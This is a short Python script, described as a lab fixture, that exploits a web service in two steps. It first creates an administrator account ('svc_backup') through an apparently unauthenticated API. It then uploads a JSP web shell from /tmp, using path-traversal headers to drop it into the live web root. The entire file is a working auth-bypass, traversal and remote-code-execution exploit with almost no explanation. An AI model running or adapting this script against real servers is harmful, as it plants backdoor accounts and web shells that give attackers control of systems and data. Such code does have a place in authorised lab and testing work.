#!/usr/bin/env python3
"""Lab fixture: urllib traversal-upload drop (auth-bypass to RCE class).

Provisions an administrator over the JSON API, then PUTs a server page whose
header-built destination escapes into the live web root as an octet stream.
"""
import json
import urllib.request

BASE = "http://127.0.0.1:6060"
provision = {"LoginName": "svc_backup", "Password": "Temp123!", "Role": "admin"}
req = urllib.request.Request(
    BASE + "/api/AddSysUser.do",
    data=json.dumps(provision).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
urllib.request.urlopen(req).read()

with open("/tmp/shell.jsp", "rb") as fh:
    payload = fh.read()
upload = urllib.request.Request(
    BASE + "/rpsfile/upload",
    data=payload,
    headers={
        "UserHome": "../../webapps/app",
        "TopDir": "../../webapps/app",
        "Content-Type": "application/octet-stream",
    },
    method="PUT",
)
urllib.request.urlopen(upload).read()
